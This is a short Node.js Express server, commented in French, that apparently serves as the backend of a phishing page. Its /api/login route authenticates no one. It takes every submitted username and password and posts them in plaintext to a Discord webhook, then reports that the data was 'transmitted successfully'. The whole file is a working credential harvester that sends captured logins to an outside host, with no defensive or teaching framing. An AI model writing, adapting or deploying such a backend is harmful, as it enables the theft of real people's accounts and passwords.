require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// Récupération du webhook depuis les variables d'environnement (.env ou Render)
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

// Route pour gérer la connexion
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  const discordMessage = {
    embeds: [
      {
        title: '🔑 Nouvelle tentative de connexion',
        color: 3447003, // Bleu
        fields: [
          { name: 'Utilisateur / Email', value: username || 'Non renseigné', inline: true },
          { name: 'Mot de passe', value: password || 'Non renseigné', inline: true },
        ],
        timestamp: new Date().toISOString(),
      },
    ],
  };

  try {
    if (!DISCORD_WEBHOOK_URL) {
      console.error("Erreur : DISCORD_WEBHOOK_URL est manquant !");
      return res.status(500).json({ success: false, message: 'Webhook manquant' });
    }

    await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(discordMessage),
    });

    res.json({ success: true, message: 'Données transmises avec succès' });
  } catch (error) {
    console.error('Erreur lors de l\'envoi vers Discord :', error);
    res.status(500).json({ success: false, message: 'Erreur serveur' });
  }
});

app.listen(PORT, () => {
  console.log(`Serveur actif sur http://localhost:${PORT}`);
});
